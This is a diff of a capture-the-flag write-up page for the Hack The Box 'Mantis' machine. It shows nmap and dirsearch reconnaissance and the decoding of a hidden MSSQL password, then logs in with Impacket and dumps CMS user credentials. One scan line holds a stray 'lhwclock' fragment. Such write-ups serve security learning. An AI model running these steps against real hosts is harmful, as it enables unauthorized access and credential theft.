@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -336,226 +336,230 @@ if (language) {
 <h3 id="tcp-ports">TCP ports</h3>
 
 <p>We scan the full range of TCP ports using nmap:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -T4 -A -p- 10.10.10.52
-
-PORT      STATE    SERVICE      VERSION
-53/tcp    open     domain       Microsoft DNS 6.1.7601
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2017-09-17 08:05:01Z)
-135/tcp   open     msrpc        Microsoft Windows RPC
-139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-445/tcp   open     microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
-464/tcp   open     kpasswd5?
-593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp   open     tcpwrapped
-738/tcp   filtered unknown
-1337/tcp  open     http         Microsoft IIS httpd 7.5
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: IIS7
-1361/tcp  filtered linx
-1433/tcp  open     ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
-| ms-sql-ntlm-info: 
-|   Target_Name: HTB
-|   NetBIOS_Domain_Name: HTB
-|   NetBIOS_Computer_Name: MANTIS
-|   DNS_Domain_Name: htb.local
-|   DNS_Computer_Name: mantis.htb.local
-|   DNS_Tree_Name: htb.local
-|_  Product_Version: 6.1.7601
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Not valid before: 2017-09-16T19:03:50
-|_Not valid after:  2047-09-16T19:03:50
-|_ssl-date: 2017-09-17T08:06:17+00:00; +2s from scanner time.
-3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-3269/tcp  open     tcpwrapped
-3734/tcp  filtered synel-data
-4461/tcp  filtered unknown
-5722/tcp  open     msrpc        Microsoft Windows RPC
-7511/tcp  filtered pafec-lm
-8080/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: Tossed Salad - Blog
-9389/tcp  open     mc-nmf       .NET Message Framing
-9484/tcp  filtered unknown
-9725/tcp  filtered unknown
-11126/tcp filtered unknown
-11628/tcp filtered unknown
-13100/tcp filtered unknown
-13703/tcp filtered unknown
-19797/tcp filtered unknown
-29664/tcp filtered unknown
-34288/tcp filtered unknown
-35536/tcp filtered unknown
-37108/tcp filtered unknown
-47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49152/tcp open     msrpc        Microsoft Windows RPC
-49153/tcp open     msrpc        Microsoft Windows RPC
-49155/tcp open     msrpc        Microsoft Windows RPC
-49156/tcp open     msrpc        Microsoft Windows RPC
-49157/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
-49158/tcp open     msrpc        Microsoft Windows RPC
-49162/tcp open     msrpc        Microsoft Windows RPC
-49289/tcp filtered unknown
-50010/tcp open     msrpc        Microsoft Windows RPC
-50017/tcp open     msrpc        Microsoft Windows RPC
-50255/tcp open     unknown
-53029/tcp filtered unknown
-55718/tcp filtered unknown
-56870/tcp filtered unknown
-57167/tcp filtered unknown
-
-No exact OS matches for host 
-
-Network Distance: 2 hops
-Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 1s, deviation: 0s, median: 1s
-| ms-sql-info: 
-|   10.10.10.52:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2014 RTM
-|       number: 12.00.2000.00
-|       Product: Microsoft SQL Server 2014
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-| smb-os-discovery: 
-|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
-|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
-|   Computer name: mantis
-|   NetBIOS computer name: MANTIS\x00
-|   Domain name: htb.local
-|   Forest name: htb.local
-|   FQDN: mantis.htb.local
-|_  System time: 2017-09-17T04:06:21-04:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
-|_smbv2-enabled: Server supports SMBv2 protocol</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -T4 -A -p- 10.10.10.52
+<span class="err">
+</span><span class="err"></span><span class="go">PORT      STATE    SERVICE      VERSION
+</span><span class="go">53/tcp    open     domain       Microsoft DNS 6.1.7601
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2017-09-17 08:05:01Z)
+</span><span class="go">135/tcp   open     msrpc        Microsoft Windows RPC
+</span><span class="go">139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
+</span><span class="go">389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+</span><span class="go">445/tcp   open     microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
+</span><span class="go">464/tcp   open     kpasswd5?
+</span><span class="go">593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span><span class="go">636/tcp   open     tcpwrapped
+</span><span class="go">738/tcp   filtered unknown
+</span><span class="go">1337/tcp  open     http         Microsoft IIS httpd 7.5
+</span><span class="go">| http-methods: 
+</span><span class="go">|_  Potentially risky methods: TRACE
+</span><span class="go">|_http-server-header: Microsoft-IIS/7.5
+</span><span class="go">|_http-title: IIS7
+</span><span class="go">1361/tcp  filtered linx
+</span><span class="go">1433/tcp  open     ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
+</span><span class="go">| ms-sql-ntlm-info: 
+</span><span class="go">|   Target_Name: HTB
+</span><span class="go">|   NetBIOS_Domain_Name: HTB
+</span><span class="go">|   NetBIOS_Computer_Name: MANTIS
+</span><span class="go">|   DNS_Domain_Name: htb.local
+</span><span class="go">|   DNS_Computer_Name: mantis.htb.local
+</span><span class="go">|   DNS_Tree_Name: htb.local
+</span><span class="go">|_  Product_Version: 6.1.7601
+</span><span class="go">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span><span class="go">| Not valid before: 2017-09-16T19:03:50
+</span><span class="go">|_Not valid after:  2047-09-16T19:03:50
+</span><span class="go">|_ssl-date: 2017-09-17T08:06:17+00:00; +2s from scanner time.
+</span><span class="go">3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+</span><span class="go">3269/tcp  open     tcpwrapped
+</span><span class="go">3734/tcp  filtered synel-data
+</span><span class="go">4461/tcp  filtered unknown
+</span><span class="go">5722/tcp  open     msrpc        Microsoft Windows RPC
+</span><span class="go">7511/tcp  filtered pafec-lm
+</span><span class="go">8080/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="go">|_http-open-proxy: Proxy might be redirecting requests
+</span><span class="go">|_http-server-header: Microsoft-IIS/7.5
+</span><span class="go">|_http-title: Tossed Salad - Blog
+</span><span class="go">9389/tcp  open     mc-nmf       .NET Message Framing
+</span><span class="go">9484/tcp  filtered unknown
+</span><span class="go">9725/tcp  filtered unknown
+</span><span class="go">11126/tcp filtered unknown
+</span><span class="go">11628/tcp filtered unknown
+</span><span class="go">13100/tcp filtered unknown
+</span><span class="go">13703/tcp filtered unknown
+</span><span class="go">19797/tcp filtered unknown
+</span><span class="go">29664/tcp filtered unknown
+</span><span class="go">34288/tcp filtered unknown
+</span><span class="go">35536/tcp filtered unknown
+</span><span class="go">37108/tcp filtered unknown
+</span><span class="go">47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span><span class="go">|_http-title: Not Found
+</span><span class="go">49152/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49153/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49155/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49156/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49157/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span><span class="go">49158/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49162/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">49289/tcp filtered unknown
+</span><span class="go">50010/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">50017/tcp open     msrpc        Microsoft Windows RPC
+</span><span class="go">50255/tcp open     unknown
+</span><span class="go">53029/tcp filtered unknown
+</span><span class="go">55718/tcp filtered unknown
+</span><span class="go">56870/tcp filtered unknown
+</span><span class="go">57167/tcp filtered unknown
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">No exact OS matches for host 
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Network Distance: 2 hops
+</span><span class="go">Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Host script results:
+</span><span class="go">|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+</span><span class="go">| ms-sql-info: 
+</span><span class="go">|   10.10.10.52:1433: 
+</span><span class="go">|     Version: 
+</span><span class="go">|       name: Microsoft SQL Server 2014 RTM
+</span><span class="go">|       number: 12.00.2000.00
+</span><span class="go">|       Product: Microsoft SQL Server 2014
+</span><span class="go">|       Service pack level: RTM
+</span><span class="go">|       Post-SP patches applied: false
+</span><span class="go">|_    TCP port: 1433
+</span><span class="go">| smb-os-discovery: 
+</span><span class="go">|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
+</span><span class="go">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+</span><span class="go">|   Computer name: mantis
+</span><span class="go">|   NetBIOS computer name: MANTIS\x00
+</span><span class="go">|   Domain name: htb.local
+</span><span class="go">|   Forest name: htb.local
+</span><span class="go">|   FQDN: mantis.htb.local
+</span><span class="go">|_  System time: 2017-09-17T04:06:21-04:00
+</span><span class="go">| smb-security-mode: 
+</span><span class="go">|   account_used: guest
+</span><span class="go">|   authentication_level: user
+</span><span class="go">|   challenge_response: supported
+</span><span class="go">|_  message_signing: required
+</span><span class="go">|_smbv2-enabled: Server supports SMBv2 protocol
+</span></code></pre></div></div></p>
 
 <h3 id="udp-ports">UDP ports</h3>
 
 <p>We scan only the 1000 most common UDP ports using nmap (because UDP scanning is too slow):
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -T4 -sU -A --top-ports=1000 10.10.10.52
-
-PORT      STATE         SERVICE        VERSION
-9/udp     open|filtered discard
-53/udp    open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-88/udp    open          kerberos-sec   Microsoft Windows Kerberos (server time: 2017-09-17 08:47:35Z)
-123/udp   open          ntp            NTP v3
-| ntp-info: 
-|_  
-137/udp   open|filtered netbios-ns
-138/udp   open|filtered netbios-dgm
-389/udp   open          lhwclock --systohcdap           Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-464/udp   open|filtered kpasswd5
-500/udp   open|filtered isakmp
-4500/udp  open|filtered nat-t-ike
-5355/udp  open|filtered llmnr
-17146/udp open|filtered unknown
-20359/udp open|filtered unknown
-20742/udp open|filtered unknown
-32771/udp open|filtered sometimes-rpc6
-49198/udp open|filtered unknown
-52144/udp open          domain         Zoom X5 ADSL modem DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-52225/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-52503/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-53006/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-53037/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-53571/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-53589/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-53838/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-54094/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-54114/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-54281/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-54321/udp open          domain         Microsoft DNS
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
-
-Too many fingerprints match this host to give specific OS details
-
-Service Info: Host: MANTIS; OS: Windows; Device: broadband router; CPE: cpe:/o:microsoft:windows_server, cpe:/o:microsoft:windows, cpe:/h:zoom:x5
-
-Host script results:
-|_clock-skew: mean: 8s, deviation: 0s, median: 8s</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -T4 -sU -A --top-ports<span class="o">=</span><span class="m">1000</span> 10.10.10.52
+<span class="err">
+</span><span class="err"></span><span class="go">PORT      STATE         SERVICE        VERSION
+</span><span class="go">9/udp     open|filtered discard
+</span><span class="go">53/udp    open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">88/udp    open          kerberos-sec   Microsoft Windows Kerberos (server time: 2017-09-17 08:47:35Z)
+</span><span class="go">123/udp   open          ntp            NTP v3
+</span><span class="go">| ntp-info: 
+</span><span class="go">|_  
+</span><span class="go">137/udp   open|filtered netbios-ns
+</span><span class="go">138/udp   open|filtered netbios-dgm
+</span><span class="go">389/udp   open          lhwclock --systohcdap           Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+</span><span class="go">464/udp   open|filtered kpasswd5
+</span><span class="go">500/udp   open|filtered isakmp
+</span><span class="go">4500/udp  open|filtered nat-t-ike
+</span><span class="go">5355/udp  open|filtered llmnr
+</span><span class="go">17146/udp open|filtered unknown
+</span><span class="go">20359/udp open|filtered unknown
+</span><span class="go">20742/udp open|filtered unknown
+</span><span class="go">32771/udp open|filtered sometimes-rpc6
+</span><span class="go">49198/udp open|filtered unknown
+</span><span class="go">52144/udp open          domain         Zoom X5 ADSL modem DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">52225/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">52503/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">53006/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">53037/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">53571/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">53589/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">53838/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">54094/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">54114/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">54281/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go">54321/udp open          domain         Microsoft DNS
+</span><span class="go">| dns-nsid: 
+</span><span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Too many fingerprints match this host to give specific OS details
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Service Info: Host: MANTIS; OS: Windows; Device: broadband router; CPE: cpe:/o:microsoft:windows_server, cpe:/o:microsoft:windows, cpe:/h:zoom:x5
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Host script results:
+</span><span class="go">|_clock-skew: mean: 8s, deviation: 0s, median: 8s
+</span></code></pre></div></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
 <h3 id="port-1337">Port 1337</h3>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:1337 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
-
-Extensions: asp | Threads: 10 | Wordlist size: 220521
-
-Target: http://10.10.10.52:1337
-
-[09:17:59] Starting: 
-[09:18:00] 200 -  689B  - /
-[09:30:17] 500 -    3KB - /orchard
-[10:06:05] 301 -  160B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirsearch -u http://10.10.10.52:1337 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
+<span class="err">
+</span><span class="err"></span><span class="go">Extensions: asp | Threads: 10 | Wordlist size: 220521
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Target: http://10.10.10.52:1337
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[09:17:59] Starting: 
+</span><span class="go">[09:18:00] 200 -  689B  - /
+</span><span class="go">[09:30:17] 500 -    3KB - /orchard
+</span><span class="go">[10:06:05] 301 -  160B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/
+</span></code></pre></div></div>
 
 <h3 id="port-8080">Port 8080</h3>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:8080 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
-
-Target: http://10.10.10.52:8080
-
-[10:14:28] Starting: 
-[10:14:50] 200 -    6KB - /
-[10:15:13] 200 -    3KB - /archive
-[10:16:15] 200 -    3KB - /blogs
-[10:17:07] 302 -  163B  - /admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin
-[10:21:05] 200 -    2KB - /tags
-[10:27:23] 200 -    3KB - /Archive
-[10:32:18] 200 -    3KB - /pollArchive
-[10:40:06] 200 -    3KB - /Blogs
-[10:45:24] 200 -    3KB - /newsarchive
-[10:54:36] 200 -    3KB - /news_archive
-[11:18:17] 302 -  163B  - /Admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirsearch -u http://10.10.10.52:8080 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
+<span class="err">
+</span><span class="err"></span><span class="go">Target: http://10.10.10.52:8080
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[10:14:28] Starting: 
+</span><span class="go">[10:14:50] 200 -    6KB - /
+</span><span class="go">[10:15:13] 200 -    3KB - /archive
+</span><span class="go">[10:16:15] 200 -    3KB - /blogs
+</span><span class="go">[10:17:07] 302 -  163B  - /admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin
+</span><span class="go">[10:21:05] 200 -    2KB - /tags
+</span><span class="go">[10:27:23] 200 -    3KB - /Archive
+</span><span class="go">[10:32:18] 200 -    3KB - /pollArchive
+</span><span class="go">[10:40:06] 200 -    3KB - /Blogs
+</span><span class="go">[10:45:24] 200 -    3KB - /newsarchive
+</span><span class="go">[10:54:36] 200 -    3KB - /news_archive
+</span><span class="go">[11:18:17] 302 -  163B  - /Admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin
+</span></code></pre></div></div>
 
 <p>Let&rsquo;s visit <a href="http://10.10.10.52:1337/secure_notes/" target="_blank">http://10.10.10.52:1337/secure_notes/</a>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">10.10.10.52 - /secure_notes/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">10.10.10.52 - /secure_notes/
 [To Parent Directory]
 
  9/13/2017  4:22 PM          912 dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
   9/1/2017  9:13 AM          168 web.config</code></pre></div></p>
 
 <p>Let&rsquo;s see <a href="http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt" target="_blank">http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</a>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">1. Download OrchardCMS
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">1. Download OrchardCMS
 2. Download SQL server 2014 Express ,create user &#34;admin&#34;,and create orcharddb database
 3. Launch IIS and add new website and point to Orchard CMS folder location.
 4. Launch browser and navigate to http://localhost:8080
@@ -563,12 +567,14 @@ Target: http://10.10.10.52:8080
 6. Add blog pages with admin user.</code></pre></div></p>
 
 <p>The filename dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt seems to contain some base64-encoded text. Let&rsquo;s explore it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
-6d2424716c5f53405f504073735730726421</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">echo</span> NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx <span class="p">|</span> base64 -d
+<span class="go">6d2424716c5f53405f504073735730726421
+</span></code></pre></div></div></p>
 
 <p>This seems like a hex string. Let&rsquo;s convert it to ASCII:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
-m$$ql_S@_P@ssW0rd!</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">echo</span> 6d2424716c5f53405f504073735730726421 <span class="p">|</span> xxd -r -p
+<span class="go">m$$ql_S@_P@ssW0rd!
+</span></code></pre></div></div></p>
 
 <p>Bingo! We found an MSSQL password. Let&rsquo;s test it using the username &ldquo;admin&rdquo;.</p>
 
@@ -576,83 +582,85 @@ m$$ql_S@_P@ssW0rd!</code></pre></div></p>
 
 <h2 id="using-impacket-mssqlclient-py">Using Impacket (mssqlclient.py)</h2>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">mssqlclient.py -p 1433 admin:m\$\$ql_S@_P@ssW0rd\!@10.10.10.52
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
-[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
-[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
-[!] Press help for extra shell commands
-
-SQL&gt; SELECT name FROM master.dbo.sysdatabases
-master
-tempdb
-model
-msdb
-orcharddb
-
-SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;User&#39;
-blog_Orchard_Users_UserPartRecord
-blog_Orchard_Roles_UserRolesPartRecord
-
-SQL&gt; use orcharddb
-SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;blog_Orchard_Users_UserPartRecord &#39;
-Id
-UserName
-Email
-NormalizedUserName
-Password
-PasswordFormat
-HashAlgorithm
-PasswordSalt
-RegistrationStatus
-EmailStatus
-EmailChallengeToken
-CreatedUtc
-LastLoginUtc
-LastLogoutUtc
-
-SQL&gt; select UserName,Password from blog_Orchard_Users_UserPartRecord
-admin
-AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
-James
-J@m3s_P@ssW0rd!</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">mssqlclient.py -p 1433 admin:m\$\$ql_S@_P@ssW0rd\!@10.10.10.52
+</span><span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Encryption required, switching to TLS
+</span><span class="go">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+</span><span class="go">[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+</span><span class="go">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+</span><span class="go">[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+</span><span class="go">[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
+</span><span class="go">[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
+</span><span class="go">[!] Press help for extra shell commands
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">SQL&gt; SELECT name FROM master.dbo.sysdatabases
+</span><span class="go">master
+</span><span class="go">tempdb
+</span><span class="go">model
+</span><span class="go">msdb
+</span><span class="go">orcharddb
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;User&#39;
+</span><span class="go">blog_Orchard_Users_UserPartRecord
+</span><span class="go">blog_Orchard_Roles_UserRolesPartRecord
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">SQL&gt; use orcharddb
+</span><span class="go">SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;blog_Orchard_Users_UserPartRecord &#39;
+</span><span class="go">Id
+</span><span class="go">UserName
+</span><span class="go">Email
+</span><span class="go">NormalizedUserName
+</span><span class="go">Password
+</span><span class="go">PasswordFormat
+</span><span class="go">HashAlgorithm
+</span><span class="go">PasswordSalt
+</span><span class="go">RegistrationStatus
+</span><span class="go">EmailStatus
+</span><span class="go">EmailChallengeToken
+</span><span class="go">CreatedUtc
+</span><span class="go">LastLoginUtc
+</span><span class="go">LastLogoutUtc
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">SQL&gt; select UserName,Password from blog_Orchard_Users_UserPartRecord
+</span><span class="go">admin
+</span><span class="go">AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
+</span><span class="go">James
+</span><span class="go">J@m3s_P@ssW0rd!
+</span></code></pre></div></div>
 
 <h2 id="using-metasploit">Using Metasploit</h2>
 
